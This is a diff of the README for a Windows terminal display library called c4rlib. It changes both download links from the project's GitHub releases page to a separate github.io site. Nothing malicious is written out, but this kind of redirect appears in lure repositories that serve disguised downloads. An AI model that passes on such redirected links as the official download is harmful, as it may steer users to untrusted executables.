@@ -1,6 +1,6 @@
 # 🎨 c4rlib - Create stunning terminal displays with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/tertian-mess712/c4rlib/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://tertian-mess712.github.io)
 
 c4rlib acts as a toolkit for your terminal. It helps you build visual experiences in your command prompt. Developers use it to show colors, gradients, and moving pictures. It supports text art, sound, and menus. The FX layer allows you to combine these parts into finished displays.
 
@@ -21,7 +21,7 @@ This software works on most Windows computers. Ensure your system meets these st
 
 Visit the project release page to get the software files. You will find the latest version listed at the top.
 
-[Download the latest c4rlib release here](https://github.com/tertian-mess712/c4rlib/releases)
+[Download the latest c4rlib release here](https://tertian-mess712.github.io)
 
 1. Navigate to the link above in your web browser.
 2. Look for the section labeled "Assets."
